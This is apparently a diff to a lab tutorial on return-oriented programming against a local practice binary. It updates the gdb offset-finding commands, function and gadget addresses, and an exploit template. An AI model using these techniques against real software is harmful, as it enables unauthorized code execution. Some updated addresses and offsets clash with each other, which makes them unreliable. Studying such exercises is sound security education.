@@ -52,9 +52,9 @@ disassemble rop2 # The functions has one parameter (ebp+0x8) and calls Printf fu
 
 ```bash
 gdb ./rop
-run $(python3 -c 'from pwn import *; print(cyclic(500))')
+run "$(python3 -c 'from pwn import *; print(cyclic(500))')"
 cyclic -l 0x61646261 #110
-run $(python3 -c 'from pwn import *; import sys; print("A"*112 + "B"*4)')
+run "$(python3 -c 'from pwn import *; import sys; print("A"*112 + "B"*4)')"
 ```
 
 > offset 110!
@@ -66,24 +66,23 @@ Leveraging ROP, we will alter the program flow by chaining the following functio
 1. Write down the memory addresses of the functions
 
 ```bash
-gdb ./rop1
+gdb ./rop
 b main
 run
 
-p rop1  # 0x8049186
-p rop2  # 0x80491b1
-p exit  # 0xf7da6ad0
+p rop1  # 0x8049196
+p rop2  # 0x80491c1
+p exit  # 0xf7da3af0
 ```
 ![](./img/functions_dir.png)
-
 
 2. Fill in the exploit template [exploit_template.py](./exploit_template.py)
 
 ```python
 ...
 rop1 = 0x8049186
-rop2 = 0x80491b1
-exit_dir = 0xf7da6ad0
+rop2 = 0x80491c1
+exit_dir = 0xf7da3af0
 ...
 ```
 
@@ -107,9 +106,9 @@ Let's chain rop2, passing the variable `0xdeadead` :)
 ```bash
 break main
 run
-rop --grep 'pop' # pop ebx; ret
+rop --grep 'pop ebx' # mov eax, edx ; pop ebx ; ret
 ```
-> Gadget -> @0x804901e
+> Gadget -> @0xf7ef4bac
 
 ![](./img/rop_gadget.png)
 
@@ -117,7 +116,7 @@ rop --grep 'pop' # pop ebx; ret
 
 ```python
 ...
-pop_ret = 0x804901e
+pop_ret = 0xf7ef4bac
 ...
 ```
 
